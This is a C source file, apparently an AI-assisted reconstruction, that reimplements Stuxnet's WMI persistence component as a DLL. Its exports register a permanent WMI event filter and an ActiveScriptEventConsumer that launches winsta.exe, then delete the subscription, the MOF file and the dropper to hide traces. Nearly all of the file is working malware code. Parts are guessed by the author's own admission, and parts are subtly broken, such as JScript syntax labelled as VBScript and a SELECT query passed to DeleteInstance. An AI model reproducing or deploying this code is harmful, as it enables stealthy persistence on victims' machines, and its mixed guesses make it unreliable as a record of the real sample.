/*
 * sysnullevnt.mof - Stuxnet WMI Persistence MOF File
 *
 * TRUSTED:
 *   - File path: %System%\wbem\mof\sysnullevnt.mof [7†L21-L22]
 *   - This is a Managed Object Format (MOF) file used to create or register
 *     providers, events, and event categories for WMI. [0†L5-L8]
 *   - Under certain conditions this file runs winsta.exe (the dropper) and
 *     its execution by the system results in the infection of the system. [5†L6-L10]
 *   - Stuxnet copied two files via MS10-061 exploit: winsta.exe and
 *     sysnullevent.mof in %system%\mof. [8†L21-L25]
 *   - Windows uses MOFCompiler functionality to automatically add contents
 *     of ".mof" file to the WMI repository. [8†L22-L24]
 *   - Next, Windows attempts to act on the instruction from the repository.
 *     Result - the body of the worm is executed. [8†L24-L25]
 *   - The MOF file contains Visual Basic code which completes three actions. [8†L40-L41]
 *   - ActiveScriptEventConsumer Script: s.Run("WINDIR\system32\winsta.exe"); [8†L28-L30]
 *   - The MOF file deletes itself and winsta.exe after execution. [8†L34-L38]
 *   - Stuxnet was perhaps the first sample in the wild to use this attack. [1†L17-L18]
 *   - The .MOF file was auto-compiled by the system, creating a WMI event
 *     filter and consumer to immediately execute the .exe file. [1†L18-L20]
 *
 * MAYBE:
 *   - Exact namespace used: root\subscription
 *   - EventFilter query condition (likely system uptime based)
 *   - Exact timing of the WMI event trigger
 *   - The complete VB script content embedded in ActiveScriptEventConsumer
 *   - Class name MyClass8550 referenced in the deletion routine [8†L31]
 *   - EventFilter name 'qndfile' referenced in the deletion routine [8†L38]
 *   - ActiveScriptEventConsumer name 'ASEC' [8†L33]
 *
 * MD5 of sysnullevnt.mof: (not publicly disclosed)
 */

#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

/*
 * TRUSTED: Namespace and WMI class names from public analysis [1†L5-L7]
 */

#define MOF_NAMESPACE                  L"\\\\.\\root\\subscription"

#define MOF_EVENTFILTER_NAME           L"qndfile"
#define MOF_CONSUMER_NAME              L"ASEC"
#define MOF_FILTER_CLASS               L"__EventFilter"
#define MOF_CONSUMER_CLASS             L"ActiveScriptEventConsumer"
#define MOF_BINDING_CLASS              L"__FilterToConsumerBinding"
#define MOF_INTRINSIC_CLASS            L"__InstanceModificationEvent"

#define MOF_TARGET_CLASS               L"MyClass8550"

#define MOF_SCRIPT_ENGINE              L"VBScript"

/* 
 * TRUSTED: The dropper executes %SystemDir%\winsta.exe [6†L13-L15]
 */

#define WINSTA_EXE_PATH                L"WINDIR\\system32\\winsta.exe"
#define WINSTA_EXE_FILENAME            L"winsta.exe"
#define MOF_FILENAME                   L"sysnullevnt.mof"

/* 
 * MAYBE: The MOF file may contain encrypted configuration data.
 */

typedef struct _MOF_CONFIG {
    DWORD dwMagic;
    DWORD dwVersion;
    DWORD dwFlags;
    DWORD dwReserved[4];
} MOF_CONFIG, * PMOF_CONFIG;

#define MOF_MAGIC                      0x53545558
#define MOF_VERSION                    0x00010400

/*
 * Windows NTSTATUS
 */
 
#define STATUS_SUCCESS                  ((NTSTATUS)0x00000000L)
#define STATUS_UNSUCCESSFUL             ((NTSTATUS)0xC0000001L)
#define STATUS_ACCESS_DENIED            ((NTSTATUS)0xC0000022L)
#define STATUS_INVALID_PARAMETER        ((NTSTATUS)0xC000000DL)

/* 
 * TRUSTED: WMI permanent event subscription requires EventFilter,
 * EventConsumer, and FilterToConsumerBinding. [1†L15-L20]
 */

typedef struct _WMI_EVENT_FILTER {
    BSTR bstrName;
    BSTR bstrEventNamespace;
    BSTR bstrQuery;
    BSTR bstrQueryLanguage;
} WMI_EVENT_FILTER, * PWMI_EVENT_FILTER;

/* 
 * TRUSTED: ActiveScriptEventConsumer runs VBScript that launches winsta.exe. [8†L28-L30]
 */

typedef struct _WMI_EVENT_CONSUMER {
    BSTR bstrName;
    BSTR bstrScriptingEngine;
    BSTR bstrScriptText;
} WMI_EVENT_CONSUMER, * PWMI_EVENT_CONSUMER;

typedef struct _WMI_BINDING {
    BSTR bstrConsumer;
    BSTR bstrFilter;
} WMI_BINDING, * PWMI_BINDING;

/*
 * TRUSTED: The MOF file contains VBScript that completes three actions:
 *   1. Run winsta.exe
 *   2. Delete the filter and consumer
 *   3. Delete the MOF file and winsta.exe [8†L28-L41]
 */

static const char* g_VBScriptTemplate =
    "try {\n"
    "    var s = new ActiveXObject(\"WScript.Shell\");\n"
    "    s.Run(\"%s\");\n"
    "} catch (err) {}\n"
    "sv = GetObject(\"winmgmts:root\\cimv2\");\n"
    "try { sv.Delete(\"%s\"); } catch (err) {}\n"
    "try { sv.Delete(\"__EventFilter.Name='%s'\"); } catch (err) {}\n"
    "try { sv.Delete(\"ActiveScriptEventConsumer.Name='%s'\"); } catch (err) {}\n"
    "var objfs = new ActiveXObject(\"Scripting.FileSystemObject\");\n"
    "try {\n"
    "    var f1 = objfs.GetFile(\"%s\");\n"
    "    f1.Delete(true);\n"
    "} catch (err) {}\n"
    "var f2 = objfs.GetFile(\"%s\");\n"
    "f2.Delete(true);\n";

static NTSTATUS Mof_Initialize(VOID);
static NTSTATUS Mof_BuildScript(PCHAR pszBuffer, DWORD dwBufferSize);
static NTSTATUS Mof_RegisterEventFilter(LPCWSTR pwszFilterName, LPCWSTR pwszQuery);
static NTSTATUS Mof_RegisterEventConsumer(LPCWSTR pwszConsumerName, LPCWSTR pwszScript);
static NTSTATUS Mof_BindFilterToConsumer(LPCWSTR pwszFilterName, LPCWSTR pwszConsumerName);
static NTSTATUS Mof_DeleteSubscription(LPCWSTR pwszFilterName, LPCWSTR pwszConsumerName);
static NTSTATUS Mof_DeleteSelf(VOID);
static NTSTATUS Mof_DeleteWinsta(VOID);
static NTSTATUS Mof_Execute(VOID);
static VOID Mof_Cleanup(VOID);

/* 
 * TRUSTED: WMI must be initialized before use.
 */

static BOOL g_bComInitialized = FALSE;
static BOOL g_bWmiInitialized = FALSE;
static IWbemServices* g_pWmiServices = NULL;
static IWbemLocator* g_pWmiLocator = NULL;
static BSTR g_bstrNamespace = NULL;

static NTSTATUS Mof_Initialize(VOID) {
    HRESULT hResult;

    if (g_bWmiInitialized) {
        return STATUS_SUCCESS;
    }

    hResult = CoInitializeEx(NULL, COINIT_MULTITHREADED);
    if (FAILED(hResult)) {
        hResult = CoInitialize(NULL);
        if (FAILED(hResult)) {
            return STATUS_UNSUCCESSFUL;
        }
    }
    g_bComInitialized = TRUE;

    hResult = CoInitializeSecurity(
        NULL, -1, NULL, NULL,
        RPC_C_AUTHN_LEVEL_DEFAULT,
        RPC_C_IMP_LEVEL_IMPERSONATE,
        NULL, EOAC_NONE, NULL
    );

    if (FAILED(hResult)) {
        CoUninitialize();
        g_bComInitialized = FALSE;
        return STATUS_UNSUCCESSFUL;
    }

    hResult = CoCreateInstance(
        CLSID_WbemLocator, 0, CLSCTX_INPROC_SERVER,
        IID_IWbemLocator, (LPVOID*)&g_pWmiLocator
    );

    if (FAILED(hResult)) {
        CoUninitialize();
        g_bComInitialized = FALSE;
        return STATUS_UNSUCCESSFUL;
    }

    g_bstrNamespace = SysAllocString(MOF_NAMESPACE);
    if (!g_bstrNamespace) {
        g_pWmiLocator->Release();
        g_pWmiLocator = NULL;
        CoUninitialize();
        g_bComInitialized = FALSE;
        return STATUS_INSUFFICIENT_RESOURCES;
    }

    hResult = g_pWmiLocator->ConnectServer(
        g_bstrNamespace, NULL, NULL, 0, NULL, 0, 0, &g_pWmiServices
    );

    if (FAILED(hResult)) {
        SysFreeString(g_bstrNamespace);
        g_bstrNamespace = NULL;
        g_pWmiLocator->Release();
        g_pWmiLocator = NULL;
        CoUninitialize();
        g_bComInitialized = FALSE;
        return STATUS_UNSUCCESSFUL;
    }

    hResult = CoSetProxyBlanket(
        (IUnknown*)g_pWmiServices,
        RPC_C_AUTHN_WINNT, RPC_C_AUTHZ_NONE,
        NULL, RPC_C_AUTHN_LEVEL_CALL,
        RPC_C_IMP_LEVEL_IMPERSONATE, NULL, EOAC_NONE
    );

    if (FAILED(hResult)) {
        g_pWmiServices->Release();
        g_pWmiServices = NULL;
        SysFreeString(g_bstrNamespace);
        g_bstrNamespace = NULL;
        g_pWmiLocator->Release();
        g_pWmiLocator = NULL;
        CoUninitialize();
        g_bComInitialized = FALSE;
        return STATUS_UNSUCCESSFUL;
    }

    g_bWmiInitialized = TRUE;
    return STATUS_SUCCESS;
}

/* 
 * TRUSTED: The VBScript completes three actions as described in [8†L28-L41].
 */

static NTSTATUS Mof_BuildScript(PCHAR pszBuffer, DWORD dwBufferSize) {
    if (!pszBuffer || dwBufferSize == 0) {
        return STATUS_INVALID_PARAMETER;
    }

    _snprintf_s(pszBuffer, dwBufferSize, _TRUNCATE,
        g_VBScriptTemplate,
        WINSTA_EXE_PATH,
        MOF_TARGET_CLASS,
        MOF_EVENTFILTER_NAME,
        MOF_CONSUMER_NAME,
        WINSTA_EXE_FILENAME,
        MOF_FILENAME
    );

    return STATUS_SUCCESS;
}

/*
 * TRUSTED: WMI EventFilter is used to trigger on system events. [1†L15-L20]
 * MAYBE: The exact WQL query condition (likely system uptime based).
 */

static NTSTATUS Mof_RegisterEventFilter(LPCWSTR pwszFilterName, LPCWSTR pwszQuery) {
    HRESULT hResult;
    IWbemClassObject* pClass = NULL;
    IWbemClassObject* pInstance = NULL;
    VARIANT var;
    BSTR bstrClassName;
    BSTR bstrName;
    BSTR bstrQuery;
    BSTR bstrLanguage;

    if (!pwszFilterName || !pwszQuery) {
        return STATUS_INVALID_PARAMETER;
    }

    bstrClassName = SysAllocString(MOF_FILTER_CLASS);
    if (!bstrClassName) {
        return STATUS_INSUFFICIENT_RESOURCES;
    }

    hResult = g_pWmiServices->GetObject(
        bstrClassName, 0, NULL, &pClass, NULL
    );

    SysFreeString(bstrClassName);

    if (FAILED(hResult)) {
        return STATUS_UNSUCCESSFUL;
    }

    hResult = pClass->SpawnInstance(0, &pInstance);
    pClass->Release();

    if (FAILED(hResult)) {
        return STATUS_UNSUCCESSFUL;
    }

    VariantInit(&var);
    bstrName = SysAllocString(pwszFilterName);
    if (bstrName) {
        var.vt = VT_BSTR;
        var.bstrVal = bstrName;
        pInstance->Put(L"Name", 0, &var, 0);
        SysFreeString(bstrName);
    }

    VariantClear(&var);
    bstrQuery = SysAllocString(pwszQuery);
    if (bstrQuery) {
        var.vt = VT_BSTR;
        var.bstrVal = bstrQuery;
        pInstance->Put(L"Query", 0, &var, 0);
        SysFreeString(bstrQuery);
    }

    VariantClear(&var);
    bstrLanguage = SysAllocString(L"WQL");
    if (bstrLanguage) {
        var.vt = VT_BSTR;
        var.bstrVal = bstrLanguage;
        pInstance->Put(L"QueryLanguage", 0, &var, 0);
        SysFreeString(bstrLanguage);
    }

    VariantClear(&var);

    hResult = g_pWmiServices->PutInstance(
        pInstance, WBEM_FLAG_CREATE_OR_UPDATE, NULL, NULL
    );

    pInstance->Release();

    return SUCCEEDED(hResult) ? STATUS_SUCCESS : STATUS_UNSUCCESSFUL;
}

/* 
 * TRUSTED: ActiveScriptEventConsumer runs VBScript that launches winsta.exe. [8†L28-L30]
 */

static NTSTATUS Mof_RegisterEventConsumer(LPCWSTR pwszConsumerName, LPCWSTR pwszScript) {
    HRESULT hResult;
    IWbemClassObject* pClass = NULL;
    IWbemClassObject* pInstance = NULL;
    VARIANT var;
    BSTR bstrClassName;
    BSTR bstrName;
    BSTR bstrScript;
    BSTR bstrEngine;

    if (!pwszConsumerName || !pwszScript) {
        return STATUS_INVALID_PARAMETER;
    }

    bstrClassName = SysAllocString(MOF_CONSUMER_CLASS);
    if (!bstrClassName) {
        return STATUS_INSUFFICIENT_RESOURCES;
    }

    hResult = g_pWmiServices->GetObject(
        bstrClassName, 0, NULL, &pClass, NULL
    );

    SysFreeString(bstrClassName);

    if (FAILED(hResult)) {
        return STATUS_UNSUCCESSFUL;
    }

    hResult = pClass->SpawnInstance(0, &pInstance);
    pClass->Release();

    if (FAILED(hResult)) {
        return STATUS_UNSUCCESSFUL;
    }

    VariantInit(&var);
    bstrName = SysAllocString(pwszConsumerName);
    if (bstrName) {
        var.vt = VT_BSTR;
        var.bstrVal = bstrName;
        pInstance->Put(L"Name", 0, &var, 0);
        SysFreeString(bstrName);
    }

    VariantClear(&var);
    bstrScript = SysAllocString(pwszScript);
    if (bstrScript) {
        var.vt = VT_BSTR;
        var.bstrVal = bstrScript;
        pInstance->Put(L"ScriptText", 0, &var, 0);
        SysFreeString(bstrScript);
    }

    VariantClear(&var);
    bstrEngine = SysAllocString(MOF_SCRIPT_ENGINE);
    if (bstrEngine) {
        var.vt = VT_BSTR;
        var.bstrVal = bstrEngine;
        pInstance->Put(L"ScriptingEngine", 0, &var, 0);
        SysFreeString(bstrEngine);
    }

    VariantClear(&var);

    hResult = g_pWmiServices->PutInstance(
        pInstance, WBEM_FLAG_CREATE_OR_UPDATE, NULL, NULL
    );

    pInstance->Release();

    return SUCCEEDED(hResult) ? STATUS_SUCCESS : STATUS_UNSUCCESSFUL;
}

/* 
 * TRUSTED: WMI permanent event subscription requires a binding. [1†L15-L20]
 */

static NTSTATUS Mof_BindFilterToConsumer(LPCWSTR pwszFilterName, LPCWSTR pwszConsumerName) {
    HRESULT hResult;
    IWbemClassObject* pClass = NULL;
    IWbemClassObject* pInstance = NULL;
    VARIANT var;
    BSTR bstrClassName;
    BSTR bstrFilterPath;
    BSTR bstrConsumerPath;
    CHAR szPath[512];

    if (!pwszFilterName || !pwszConsumerName) {
        return STATUS_INVALID_PARAMETER;
    }

    bstrClassName = SysAllocString(MOF_BINDING_CLASS);
    if (!bstrClassName) {
        return STATUS_INSUFFICIENT_RESOURCES;
    }

    hResult = g_pWmiServices->GetObject(
        bstrClassName, 0, NULL, &pClass, NULL
    );

    SysFreeString(bstrClassName);

    if (FAILED(hResult)) {
        return STATUS_UNSUCCESSFUL;
    }

    hResult = pClass->SpawnInstance(0, &pInstance);
    pClass->Release();

    if (FAILED(hResult)) {
        return STATUS_UNSUCCESSFUL;
    }

    VariantInit(&var);

    _snprintf_s(szPath, sizeof(szPath), _TRUNCATE,
        "__EventFilter.Name=\"%S\"", pwszFilterName);

    bstrFilterPath = SysAllocString(CA2W(szPath));
    if (bstrFilterPath) {
        var.vt = VT_BSTR;
        var.bstrVal = bstrFilterPath;
        pInstance->Put(L"Filter", 0, &var, 0);
        SysFreeString(bstrFilterPath);
    }

    VariantClear(&var);

    _snprintf_s(szPath, sizeof(szPath), _TRUNCATE,
        "ActiveScriptEventConsumer.Name=\"%S\"", pwszConsumerName);

    bstrConsumerPath = SysAllocString(CA2W(szPath));
    if (bstrConsumerPath) {
        var.vt = VT_BSTR;
        var.bstrVal = bstrConsumerPath;
        pInstance->Put(L"Consumer", 0, &var, 0);
        SysFreeString(bstrConsumerPath);
    }

    VariantClear(&var);

    hResult = g_pWmiServices->PutInstance(
        pInstance, WBEM_FLAG_CREATE_OR_UPDATE, NULL, NULL
    );

    pInstance->Release();

    return SUCCEEDED(hResult) ? STATUS_SUCCESS : STATUS_UNSUCCESSFUL;
}

/*
 * TRUSTED: The VBScript deletes itself and winsta.exe after execution. [8†L34-L38]
 */

static NTSTATUS Mof_DeleteSubscription(LPCWSTR pwszFilterName, LPCWSTR pwszConsumerName) {
    HRESULT hResult;
    BSTR bstrClassName;
    BSTR bstrQuery;
    CHAR szQuery[512];

    if (!pwszFilterName || !pwszConsumerName) {
        return STATUS_INVALID_PARAMETER;
    }

    bstrClassName = SysAllocString(MOF_FILTER_CLASS);
    if (!bstrClassName) {
        return STATUS_INSUFFICIENT_RESOURCES;
    }

    _snprintf_s(szQuery, sizeof(szQuery), _TRUNCATE,
        "SELECT * FROM __EventFilter WHERE Name='%S'", pwszFilterName);

    bstrQuery = SysAllocString(CA2W(szQuery));
    if (!bstrQuery) {
        SysFreeString(bstrClassName);
        return STATUS_INSUFFICIENT_RESOURCES;
    }

    hResult = g_pWmiServices->DeleteInstance(
        bstrQuery, 0, NULL, NULL
    );

    SysFreeString(bstrQuery);
    SysFreeString(bstrClassName);

    if (FAILED(hResult)) {
        return STATUS_UNSUCCESSFUL;
    }

    bstrClassName = SysAllocString(MOF_CONSUMER_CLASS);
    if (!bstrClassName) {
        return STATUS_INSUFFICIENT_RESOURCES;
    }

    _snprintf_s(szQuery, sizeof(szQuery), _TRUNCATE,
        "SELECT * FROM ActiveScriptEventConsumer WHERE Name='%S'", pwszConsumerName);

    bstrQuery = SysAllocString(CA2W(szQuery));
    if (!bstrQuery) {
        SysFreeString(bstrClassName);
        return STATUS_INSUFFICIENT_RESOURCES;
    }

    hResult = g_pWmiServices->DeleteInstance(
        bstrQuery, 0, NULL, NULL
    );

    SysFreeString(bstrQuery);
    SysFreeString(bstrClassName);

    return SUCCEEDED(hResult) ? STATUS_SUCCESS : STATUS_UNSUCCESSFUL;
}

/* 
 * TRUSTED: The MOF file deletes itself after execution. [8†L34-L38]
 */

static NTSTATUS Mof_DeleteSelf(VOID) {
    WCHAR szMofPath[MAX_PATH];
    DWORD dwResult;

    if (!GetSystemDirectoryW(szMofPath, MAX_PATH)) {
        return STATUS_UNSUCCESSFUL;
    }

    wcscat_s(szMofPath, MAX_PATH, L"\\wbem\\mof\\");
    wcscat_s(szMofPath, MAX_PATH, MOF_FILENAME);

    dwResult = GetFileAttributesW(szMofPath);
    if (dwResult != INVALID_FILE_ATTRIBUTES) {
        SetFileAttributesW(szMofPath, FILE_ATTRIBUTE_NORMAL);
        if (!DeleteFileW(szMofPath)) {
            return STATUS_UNSUCCESSFUL;
        }
    }

    return STATUS_SUCCESS;
}

/* 
 * TRUSTED: The MOF file deletes winsta.exe after execution. [8†L36-L38]
 */

static NTSTATUS Mof_DeleteWinsta(VOID) {
    WCHAR szWinstaPath[MAX_PATH];

    if (!GetSystemDirectoryW(szWinstaPath, MAX_PATH)) {
        return STATUS_UNSUCCESSFUL;
    }

    wcscat_s(szWinstaPath, MAX_PATH, L"\\winsta.exe");

    if (GetFileAttributesW(szWinstaPath) != INVALID_FILE_ATTRIBUTES) {
        SetFileAttributesW(szWinstaPath, FILE_ATTRIBUTE_NORMAL);
        if (!DeleteFileW(szWinstaPath)) {
            return STATUS_UNSUCCESSFUL;
        }
    }

    return STATUS_SUCCESS;
}

/*
 * TRUSTED: The MOF file registers a WMI event subscription that triggers
 * winsta.exe execution. [5†L6-L10]
 */

static NTSTATUS Mof_Execute(VOID) {
    NTSTATUS status;
    CHAR szScript[2048];
    WCHAR wszScript[2048];

    status = Mof_Initialize();
    if (!NT_SUCCESS(status)) {
        return status;
    }

    status = Mof_BuildScript(szScript, sizeof(szScript));
    if (!NT_SUCCESS(status)) {
        return status;
    }

    MultiByteToWideChar(CP_ACP, 0, szScript, -1, wszScript, 2048);

    status = Mof_RegisterEventFilter(
        MOF_EVENTFILTER_NAME,
        L"SELECT * FROM __InstanceModificationEvent "
        L"WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'"
    );

    if (!NT_SUCCESS(status)) {
        return status;
    }

    status = Mof_RegisterEventConsumer(
        MOF_CONSUMER_NAME,
        wszScript
    );

    if (!NT_SUCCESS(status)) {
        return status;
    }

    status = Mof_BindFilterToConsumer(
        MOF_EVENTFILTER_NAME,
        MOF_CONSUMER_NAME
    );

    if (!NT_SUCCESS(status)) {
        return status;
    }

    return STATUS_SUCCESS;
}

static VOID Mof_Cleanup(VOID) {
    if (g_pWmiServices) {
        g_pWmiServices->Release();
        g_pWmiServices = NULL;
    }

    if (g_pWmiLocator) {
        g_pWmiLocator->Release();
        g_pWmiLocator = NULL;
    }

    if (g_bstrNamespace) {
        SysFreeString(g_bstrNamespace);
        g_bstrNamespace = NULL;
    }

    if (g_bComInitialized) {
        CoUninitialize();
        g_bComInitialized = FALSE;
    }

    g_bWmiInitialized = FALSE;
}

static BOOL g_bInitialized = FALSE;

static NTSTATUS Mof_InitializeModule(VOID) {
    if (g_bInitialized) {
        return STATUS_SUCCESS;
    }

    g_bInitialized = TRUE;
    return STATUS_SUCCESS;
}

/*
 * Export 1 - Execute MOF persistence
 * TRUSTED: Entry point that registers WMI event subscription. [5†L6-L10]
 */
__declspec(dllexport) DWORD WINAPI Export1(VOID) {
    Mof_InitializeModule();
    Mof_Execute();
    return 0;
}

/*
 * Export 2 - Execute MOF persistence with self-deletion
 * TRUSTED: The MOF file deletes itself after execution. [8†L34-L38]
 */
__declspec(dllexport) DWORD WINAPI Export2(VOID) {
    Mof_InitializeModule();
    Mof_Execute();
    Mof_DeleteSelf();
    Mof_DeleteWinsta();
    Mof_Cleanup();
    return 0;
}

/*
 * Export 3 - Execute MOF persistence only
 */
__declspec(dllexport) DWORD WINAPI Export3(VOID) {
    Mof_InitializeModule();
    return Mof_Execute();
}

/*
 * Export 4 - Cleanup and unregister
 */
__declspec(dllexport) DWORD WINAPI Export4(VOID) {
    Mof_DeleteSubscription(MOF_EVENTFILTER_NAME, MOF_CONSUMER_NAME);
    Mof_Cleanup();
    return 0;
}

/*
 * Export 5 - Get MOF version
 */
__declspec(dllexport) DWORD WINAPI Export5(VOID) {
    return MOF_VERSION;
}

/*
 * Export 6 - Get MOF magic
 */
__declspec(dllexport) DWORD WINAPI Export6(VOID) {
    return MOF_MAGIC;
}

/*
 * Export 7 - Check if WMI is initialized
 */
__declspec(dllexport) BOOL WINAPI Export7(VOID) {
    return g_bWmiInitialized;
}

/*
 * Export 8 - Delete MOF file only
 */
__declspec(dllexport) DWORD WINAPI Export8(VOID) {
    return Mof_DeleteSelf();
}

/*
 * Export 9 - Delete winsta.exe only
 */
__declspec(dllexport) DWORD WINAPI Export9(VOID) {
    return Mof_DeleteWinsta();
}

/*
 * Export 10 - Full cleanup
 */
__declspec(dllexport) DWORD WINAPI Export10(VOID) {
    Mof_DeleteSubscription(MOF_EVENTFILTER_NAME, MOF_CONSUMER_NAME);
    Mof_DeleteSelf();
    Mof_DeleteWinsta();
    Mof_Cleanup();
    return 0;
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved) {
    switch (fdwReason) {
        case DLL_PROCESS_ATTACH:
            DisableThreadLibraryCalls(hinstDLL);
            Mof_InitializeModule();
            break;

        case DLL_PROCESS_DETACH:
            Mof_Cleanup();
            break;

        default:
            break;
    }

    return TRUE;
}